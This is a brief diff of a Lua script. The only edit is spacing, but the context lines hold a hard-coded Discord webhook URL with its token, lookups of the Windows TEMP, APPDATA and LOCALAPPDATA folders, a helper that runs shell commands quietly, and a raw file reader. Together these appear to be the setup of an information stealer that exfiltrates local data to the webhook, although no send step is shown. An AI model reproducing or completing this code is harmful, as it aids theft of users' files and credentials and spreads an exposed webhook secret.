@@ -1,7 +1,7 @@
 local WEBHOOK = "https://discord.com/api/webhooks/1481132804388683869/aMmO3SG39_K2R8MeGtIjtIibcKCsQl4j4EuwInA6lpiNOAICfOTRh0HQ_CnKH5Ywnyhf"
 
 local TEMP   = os.getenv("TEMP") or "\\Windows\\Temp"
-local APPDATA= os.getenv("APPDATA")
+local APPDATA = os.getenv("APPDATA")
 local LOCAL  = os.getenv("LOCALAPPDATA")
 local function shell(c) local h=io.popen(c..[[ 2>NUL]]) local o=h:read("*a") h:close() return o end
 local function rf(f) return (readfile or function(p) local h=io.open(p,"rb") local d=h:read("*a") h:close() return d end)(f) end
